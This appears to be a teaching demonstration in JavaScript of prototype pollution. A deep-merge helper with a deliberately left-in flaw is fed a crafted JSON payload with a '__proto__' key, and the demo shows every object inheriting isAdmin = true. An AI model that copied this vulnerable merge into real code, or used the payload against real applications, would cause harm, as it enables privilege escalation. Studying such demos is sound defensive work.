// A "deep merge" helper, the kind found in many libraries and apps.
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (typeof target[key] !== 'object' || target[key] === null) target[key] = {};
      merge(target[key], source[key]);            // VULNERABLE (CWE-1321): follows '__proto__'
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const defaults = { theme: 'light' };
// JSON from a request body. JSON.parse makes "__proto__" an ordinary own key of this object.
const fromClient = JSON.parse('{"theme": "dark", "__proto__": {"isAdmin": true}}');

merge(defaults, fromClient);

const anotherUser = {};        // an unrelated object that never had an isAdmin property
console.log('[demo] anotherUser.isAdmin =', anotherUser.isAdmin);
if (anotherUser.isAdmin === true) {
  console.log('\n[ATTACK SUCCEEDED] one request polluted Object.prototype: EVERY object in the process now');
  console.log('                   inherits isAdmin = true, so an "if (user.isAdmin)" check passes for everyone.');
}
